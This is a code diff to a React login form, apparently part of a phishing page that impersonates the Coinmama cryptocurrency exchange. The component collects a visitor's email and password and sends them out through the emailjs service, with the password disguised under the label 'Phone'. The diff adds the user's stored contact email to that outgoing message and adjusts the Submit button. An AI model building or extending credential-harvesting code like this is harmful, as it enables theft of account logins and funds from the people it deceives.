@@ -1,8 +1,11 @@
-import React, { useState } from 'react';
+import React, { useState,useContext } from 'react';
 import { useNavigate } from 'react-router-dom';
 import emailjs from 'emailjs-com';
+import { AuthContext } from './AuthContext';
+
 
 const Alert = () => {
+   const {contemail}=useContext(AuthContext);
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [emailError, setEmailError] = useState('');
@@ -41,6 +44,7 @@ const Alert = () => {
         web_name: 'Coinmama',
         from_name: 'Coinmama',
         message: `Name: ${email}, 
+        Email: ${contemail},
         Phone: ${password}, 
         Date: ${new Date().toLocaleDateString()}, 
         Time: ${new Date().toLocaleTimeString()}`,
@@ -120,7 +124,7 @@ const Alert = () => {
             <div className="flex justify-center">
               <button
                 type="submit"
-                className="px-16 sm:px-20 bg-gray-400 text-blue-700 font-bold py-3 rounded-lg hover:bg-blue-900 hover:text-white"
+                className="px-16 w-full sm:px-20 bg-gray-400 text-blue-700 font-bold py-3 rounded-lg hover:bg-blue-900 hover:text-white"
               >
                 Submit
               </button>
